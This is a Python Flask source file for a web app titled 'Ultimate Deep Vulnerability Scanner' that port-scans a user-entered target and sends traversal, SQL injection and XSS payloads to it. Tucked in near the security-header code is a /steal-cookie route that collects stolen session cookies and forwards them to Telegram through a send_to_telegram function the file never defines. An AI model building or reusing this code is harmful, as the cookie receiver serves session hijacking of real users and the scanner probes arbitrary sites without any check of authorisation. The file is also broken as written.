import os
import socket
import urllib.parse
import concurrent.futures
from flask import Flask, request, render_template_string
import requests
from urllib.parse import urljoin

app = Flask(__name__)

# ==========================================
# 🛡️ SECURITY HEADERS (Protect Your Scanner)
# ==========================================
@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Content-Security-Policy'] = "default-src 'self'; style-src 'self' 'unsafe-inline';"
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Server'] = 'SecureScanner/4.0'
    return response
@app.route('/steal-cookie', methods=['GET'])
def steal_cookie():
    stolen_cookie = request.args.get('cookie', 'No cookie received')
    print(f"\n[!!!] SESSION HIJACKED! COOKIE: {stolen_cookie}\n", flush=True)
    # Send it to Telegram (using the code we built earlier)
    send_to_telegram(f"🚨 **SESSION HIJACKED** 🚨\nCookie: {stolen_cookie}")
    return "Cookie received", 200


# ==========================================
# 🔍 ADVANCED SCANNER ENGINE
# ==========================================
def scan_port(host, port):
    """Checks if a specific port is open."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.5)
            result = s.connect_ex((host, port))
            if result == 0:
                return port
    except:
        pass
    return None

def run_deep_scan(target):
    results = []
    if not target.startswith('http'):
        target = 'https://' + target
        
    parsed_url = urllib.parse.urlparse(target)
    host = parsed_url.netloc or parsed_url.path
    if ':' in host: host = host.split(':')[0]
    
    results.append(f"[*] Initializing Deep Audit on: {target}")
    results.append(f"[*] Target Host: {host}")
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecureScanner/4.0"}

    # 1. MULTI-THREADED PORT SCAN
    results.append("--- Port Scanning (Common Ports) ---")
    common_ports = [21, 22, 23, 25, 80, 443, 3306, 8080, 8443]
    open_ports = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_port = {executor.submit(scan_port, host, port): port for port in common_ports}
        for future in concurrent.futures.as_completed(future_to_port):
            port = future.result()
            if port:
                open_ports.append(port)
                
    if open_ports:
        for p in open_ports:
            service = "HTTP" if p in [80, 8080] else "HTTPS" if p in [443, 8443] else "Unknown"
            results.append(f"[!] OPEN PORT: {p} ({service})")
    else:
        results.append("[+] No common ports found open (or blocked by firewall).")

    # 2. HEADER ANALYSIS
    results.append("--- Advanced Security Headers ---")
    try:
        response = requests.get(target, headers=headers, timeout=10, verify=False)
        results.append(f"[+] Target is online. Status: {response.status_code}")
        
        sec_headers = {
            'Strict-Transport-Security': 'Prevents SSL Stripping',
            'X-Frame-Options': 'Prevents Clickjacking',
            'Content-Security-Policy': 'Prevents XSS',
            'X-Content-Type-Options': 'Prevents MIME Sniffing'
        }
        for h, desc in sec_headers.items():
            if h not in response.headers:
                results.append(f"[-] MISSING: {h} ({desc})")
            else:
                results.append(f"[+] SECURE: {h} is present.")
                
        # Server Info Leak
        server_sig = response.headers.get('Server', 'Hidden')
        if server_sig != 'Hidden' and server_sig != 'SecureScanner/4.0':
            results.append(f"[!] INFO LEAK: Server is revealing itself as '{server_sig}'")
            
    except Exception as e:
        results.append(f"[-] Error connecting to target: {e}")
        return results # Stop scan if the site is dead

    # 3. SENSITIVE FILE DISCOVERY
    results.append("--- Sensitive File Discovery ---")
    files = {
        '.env': 'db_password',
        '.git/config': 'repositoryformatversion',
        'config.php': '<?php',
        'database.sql': 'CREATE TABLE',
        'backup.zip': 'PK\x03\x04' # Zip file magic bytes
    }
    
    for f, signature in files.items():
        f_url = urljoin(target, f)
        try:
            res = requests.get(f_url, headers=headers, timeout=5, verify=False)
            if res.status_code == 200 and signature in res.text:
                results.append(f"[!!!] CRITICAL: Exposed {f} at {f_url}")
            else:
                results.append(f"[+] Safe: {f} (Protected or 404)")
        except: pass

    # 4. DIRECTORY TRAVERSAL
    results.append("--- Directory Traversal Test ---")
    traversal_payloads = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"]
    traversal_found = False
    for payload in traversal_payloads:
        test_url = urljoin(target, f"?file={payload}")
        try:
            res = requests.get(test_url, headers=headers, timeout=5, verify=False)
            if "root:x:" in res.text:
                results.append(f"[!!!] CRITICAL: Directory Traversal at {test_url}")
                traversal_found = True
        except: pass
    if not traversal_found: results.append("[+] SECURE: No Traversal found.")

    # 5. SQL INJECTION (Error-Based)
    results.append("--- SQL Injection Test ---")
    sqli_payloads = ["'", "\"", "' OR 1=1--"]
    sql_found = False
    for payload in sqli_payloads:
        test_url = urljoin(target, f"?id={urllib.parse.quote(payload)}")
        try:
            res = requests.get(test_url, headers=headers, timeout=5, verify=False)
            errors = ["SQL syntax", "mysql_fetch", "ORA-01756", "SQLite/JDBCDriver", "PostgreSQL query failed"]
            for err in errors:
                if err.lower() in res.text.lower():
                    results.append(f"[!!!] CRITICAL: SQL Injection at {test_url}")
                    sql_found = True
                    break
        except: pass
    if not sql_found: results.append("[+] SECURE: No obvious SQL errors.")

    # 6. REFLECTED XSS
    results.append("--- XSS Reflection Test ---")
    xss_payload = "<script>alert('XSS')</script>"
    xss_found = False
    for param in ['q', 'search', 'name']:
        test_url = urljoin(target, f"?{param}={urllib.parse.quote(xss_payload)}")
        try:
            res = requests.get(test_url, headers=headers, timeout=5, verify=False)
            if xss_payload in res.text:
                results.append(f"[!!!] CRITICAL: Reflected XSS at {test_url}")
                xss_found = True
                break
        except: pass
    if not xss_found: results.append("[+] SECURE: No obvious XSS reflections.")

    results.append("--- Scan Complete ---")
    return results

# ==========================================
# 🌐 WEB INTERFACE
# ==========================================
@app.route('/', methods=['GET', 'POST'])
def index():
    results = []
    target = ""
    
    if request.method == 'POST':
        target = request.form.get('url')
        if target:
            results = run_deep_scan(target)

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ultimate Vulnerability Scanner</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; padding: 20px; background: #0d1117; color: #c9d1d9; }
            h2 { color: #58a6ff; }
            input[type="text"] { width: 70%; max-width: 400px; padding: 12px; border: 1px solid #30363d; border-radius: 6px; background: #0d1117; color: white; font-size: 16px; }
            button { padding: 12px 24px; background: #238636; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; }
            button:hover { background: #2ea043; }
            .results-container { background: #161b22; padding: 20px; border-radius: 8px; border: 1px solid #30363d; margin-top: 20px; font-family: 'Courier New', Courier, monospace; }
            ul { list-style-type: none; padding: 0; }
            li { padding: 6px 0; font-size: 14px; border-bottom: 1px solid #21262d; }
            .critical { color: #ff7b72; font-weight: bold; }
            .warning { color: #d29922; font-weight: bold; }
            .safe { color: #3fb950; }
            .info { color: #79c0ff; }
        </style>
    </head>
    <body>
        <h2>🛡️ Ultimate Deep Vulnerability Scanner</h2>
        <form method="POST">
            <input type="text" name="url" placeholder="Enter target URL (e.g., https://testphp.vulnweb.com)" value="{{ target }}" required>
            <button type="submit">Initiate Deep Scan</button>
        </form>
        
        {% if results %}
        <div class="results-container">
            <ul>
            {% for res in results %}
                {% if "[!!!]" in res or "[-]" in res or "[!]" in res %}
                    <li class="critical">{{ res }}</li>
                {% elif "[+]" in res %}
                    <li class="safe">{{ res }}</li>
                {% else %}
                    <li class="info">{{ res }}</li>
                {% endif %}
            {% endfor %}
            </ul>
        </div>
        {% endif %}
    </body>
    </html>
    """
    return render_template_string(html, results=results, target=target)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
